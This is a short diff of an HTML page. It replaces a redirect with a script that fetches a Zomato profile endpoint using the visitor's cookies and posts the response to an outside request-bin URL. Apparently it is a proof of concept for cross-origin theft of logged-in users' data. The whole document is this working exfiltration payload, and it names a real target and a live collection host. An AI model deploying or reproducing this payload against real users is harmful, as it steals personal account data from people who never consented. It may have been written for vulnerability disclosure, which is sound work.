@@ -1,9 +1,21 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <body>
+<h1>Loading...</h1>
 <script>
-location.href =
-  "https://zoma.to/webroutes/getPage?page_url=/profile";
+fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
+    credentials: 'include'
+})
+.then(response => response.json())
+.then(data => {
+    // Send to your RequestBin
+    fetch('https://eomfuajl79ed6za.m.pipedream.net', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify(data)
+    });
+})
+.catch(err => console.log('Error:', err));
 </script>
 </body>
 </html>
